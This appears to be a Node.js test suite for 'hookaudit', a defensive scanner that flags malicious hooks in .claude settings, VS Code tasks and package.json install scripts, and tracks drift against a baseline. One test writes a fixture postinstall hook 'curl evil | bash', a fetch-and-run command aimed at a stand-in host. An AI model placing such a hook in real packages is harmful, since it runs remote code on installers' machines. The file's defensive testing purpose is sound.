'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');

const BIN = path.join(__dirname, '..', 'bin', 'hookaudit.js');
const FIXTURES = path.join(__dirname, 'fixtures');

function run(args, cwd) {
  try {
    const stdout = execFileSync('node', [BIN, ...args], { cwd, encoding: 'utf8' });
    return { stdout, code: 0 };
  } catch (e) {
    return { stdout: e.stdout ? e.stdout.toString() : '', code: e.status };
  }
}

test('clean repo scan finds no CRITICAL findings and exits 0', () => {
  const { stdout, code } = run(['scan', '--json', '--path', path.join(FIXTURES, 'clean-repo')]);
  const data = JSON.parse(stdout);
  const findings = data.results.flatMap((r) => r.findings);
  assert.equal(findings.some((f) => f.severity === 'CRITICAL'), false);
  assert.equal(code, 0);
});

test('malicious-pattern repo is flagged CRITICAL and exits 1', () => {
  const { stdout, code } = run(['scan', '--json', '--path', path.join(FIXTURES, 'malicious-repo')]);
  const data = JSON.parse(stdout);
  const findings = data.results.flatMap((r) => r.findings);
  assert.ok(findings.some((f) => f.severity === 'CRITICAL'), 'expected at least one CRITICAL finding');
  assert.equal(code, 1);
});

test('cross-reference between .claude and .vscode is detected', () => {
  const { stdout } = run(['scan', '--json', '--path', path.join(FIXTURES, 'malicious-repo')]);
  const data = JSON.parse(stdout);
  const findings = data.results.flatMap((r) => r.findings);
  assert.ok(
    findings.some((f) => f.reasons.some((r) => r.includes('cross-linking'))),
    'expected a cross-reference finding'
  );
});

test('runtime-bootstrap + network-fetch pattern is detected in vscode task', () => {
  const { stdout } = run(['scan', '--json', '--path', path.join(FIXTURES, 'malicious-repo')]);
  const data = JSON.parse(stdout);
  const taskFile = data.results.find((r) => r.file.endsWith('tasks.json'));
  assert.ok(taskFile.findings.some((f) => f.severity === 'CRITICAL'));
});

test('obfuscated preinstall script is flagged', () => {
  const { stdout } = run(['scan', '--json', '--path', path.join(FIXTURES, 'malicious-repo')]);
  const data = JSON.parse(stdout);
  const pkg = data.results.find((r) => r.file === 'package.json');
  assert.ok(pkg.findings.length > 0);
});

test('baseline then diff on unchanged repo reports no drift', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hookaudit-'));
  fs.cpSync(path.join(FIXTURES, 'clean-repo'), tmp, { recursive: true });
  run(['baseline', '--path', tmp]);
  const { stdout } = run(['diff', '--json', '--path', tmp]);
  const data = JSON.parse(stdout);
  assert.equal(data.diff.changes.length, 0);
});

test('baseline then a new hook file appearing is reported as NEW drift', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hookaudit-'));
  fs.cpSync(path.join(FIXTURES, 'clean-repo'), tmp, { recursive: true });
  run(['baseline', '--path', tmp]);
  fs.cpSync(
    path.join(FIXTURES, 'malicious-repo', '.vscode', 'tasks.json'),
    path.join(tmp, '.vscode', 'tasks.json')
  );
  const { stdout } = run(['diff', '--json', '--path', tmp]);
  const data = JSON.parse(stdout);
  assert.ok(data.diff.changes.some((c) => c.type === 'CHANGED' && c.file === '.vscode/tasks.json'));
});

test('malformed JSON in a surface file is reported as a parse error, not a crash', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hookaudit-'));
  fs.mkdirSync(path.join(tmp, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(tmp, '.claude', 'settings.json'), '{ not valid json');
  const { stdout, code } = run(['scan', '--json', '--path', tmp]);
  const data = JSON.parse(stdout);
  const f = data.results.find((r) => r.file === '.claude/settings.json');
  assert.equal(f.parseError, 'invalid JSON');
  assert.equal(code, 0); // parse error alone is not CRITICAL
});

test('node_modules is never walked', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hookaudit-'));
  fs.mkdirSync(path.join(tmp, 'node_modules', 'some-pkg'), { recursive: true });
  fs.writeFileSync(path.join(tmp, 'node_modules', 'some-pkg', 'package.json'), '{"scripts":{"postinstall":"curl evil | bash"}}');
  const { stdout } = run(['scan', '--json', '--path', tmp]);
  const data = JSON.parse(stdout);
  assert.equal(data.results.length, 0);
});
